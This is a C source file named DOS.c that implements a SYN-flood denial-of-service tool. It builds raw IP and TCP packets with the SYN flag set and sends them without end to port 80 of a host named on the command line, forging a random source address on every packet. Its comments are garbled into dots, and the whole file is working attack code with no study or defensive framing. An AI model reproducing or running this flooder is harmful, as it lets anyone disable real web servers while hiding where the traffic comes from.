/********************  DOS.c               *****************/ 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <endian.h>
#include <errno.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
#include <sys/types.h>
#include <string.h>
#include <arpa/inet.h>

#define DESTPORT        80       /* ......(WEB)      */ 
#define LOCALPORT       8888 

void send_tcp(int sockfd,struct sockaddr_in *addr); 
unsigned short check_sum(unsigned short *addr,int len); 

int main(int argc,char **argv) 
{ 
    int sockfd; 
    struct sockaddr_in addr; 
    struct hostent *host; 
    int on=1; 

    if(argc!=2) 
    { 
        fprintf(stderr,"Usage:%s hostname\n\a",argv[0]); 
        exit(1); 
    } 

    bzero(&addr,sizeof(struct sockaddr_in)); 
    addr.sin_family=AF_INET; 
    addr.sin_port=htons(DESTPORT); 

    if(inet_aton(argv[1],&addr.sin_addr)==0) 
    { 
        host=gethostbyname(argv[1]); 
        if(host==NULL) 
        { 
                fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno)); 
                exit(1); 
        } 
        addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]); 
    } 
    //printf("sin_add is %x.\n",addr.sin_addr);
    /**** ..IPPROTO_TCP....TCP......    ****/ 

    sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); 
    if(sockfd<0) 
    { 
        fprintf(stderr,"Socket Error:%s\n\a",strerror(errno)); 
        exit(1); 
    } 
    /********  ..IP.....,........IP...........  ***/ 

    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)); 

    /****  ....,.................    *********/ 
    setuid(getpid()); 

    /*********  .....!!!!          ****/ 
    send_tcp(sockfd,&addr); 
    
    return 0;
}  



/*******  .......   *********/ 
void send_tcp(int sockfd,struct sockaddr_in *addr) 
{ 
    char buffer[100];  /**** ..........  ****/ 
    struct ip *ip; 
    struct tcphdr *tcp; 
    int head_len; 
    /******* ...............,.............  ***/ 

    head_len=sizeof(struct ip)+sizeof(struct tcphdr); 

    bzero(buffer,100); 

    /********  ..IP......,...IP.....?     ******/  
    ip=(struct ip *)buffer; 
    ip->ip_v=IPVERSION;             /** ...... 4      **/ 
    ip->ip_hl=sizeof(struct ip)>>2; /** IP........  **/ 
    ip->ip_tos=0;                   /** ....            **/ 
    ip->ip_len=htons(head_len);     /** IP......      **/ 
    ip->ip_id=0;                    /** .......      **/ 
    ip->ip_off=0;                   /** .....,.... **/         
    ip->ip_ttl=MAXTTL;              /** .....   255    **/ 
    ip->ip_p=IPPROTO_TCP;           /** ...... TCP.  **/  
    ip->ip_sum=0;                   /** ........    **/ 
    ip->ip_dst=addr->sin_addr;      /** .......      **/ 

    /*******  ....TCP...                           *****/ 
    tcp=(struct tcphdr *)(buffer +sizeof(struct ip)); 
    tcp->source=htons(LOCALPORT); 
    tcp->dest=addr->sin_port;           /** ....    **/ 
    tcp->seq=random(); 
    tcp->ack_seq=0; 
    tcp->doff=5; 
    tcp->syn=1;                        /** ...... **/ 
    tcp->check=0; 


    /** ..,...........,.......?? ^_^  **/ 
    while(1) 
    { 
        /**  ...........,......!      **/ 
        ip->ip_src.s_addr = random();      

        /** ........,........,............. */ 
        /**            ........    */ 
        tcp->check = check_sum((unsigned short *)tcp,sizeof(struct tcphdr));  
        sendto(sockfd,buffer,head_len,0,(struct sockaddr *)addr,sizeof(struct sockaddr_in)); 
     } 
} 

/* ...........,..... */ 
unsigned short check_sum(unsigned short *addr,int len) 
{ 
    register int nleft = len; 
    register int sum = 0; 
    register short *w = addr; 
    short answer = 0; 

    while(nleft>1) 
    { 
        sum += *w++; 
        nleft -= 2; 
    } 
    if(nleft==1) 
    { 
        *(unsigned char *)(&answer)=*(unsigned char *)w; 
        sum += answer; 
    } 

    sum = (sum >> 16) + (sum & 0xffff); 
    sum += (sum >> 16); 
    answer =~ sum;

    return(answer); 
} 



